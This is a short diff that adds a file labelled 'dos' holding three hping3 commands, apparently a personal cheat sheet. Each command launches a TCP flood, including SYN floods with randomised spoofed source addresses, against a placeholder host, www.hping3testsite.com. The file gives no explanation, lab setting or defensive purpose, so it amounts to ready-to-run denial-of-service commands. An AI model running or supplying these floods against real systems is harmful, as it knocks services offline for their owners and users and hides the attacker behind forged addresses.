@@ -1,0 +1,7 @@
+dos 
+hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com
+hping3 -S --flood -V www.hping3testsite.com
+hping3 -S -P -U --flood -V --rand-source www.hping3testsite.com
+
+
+
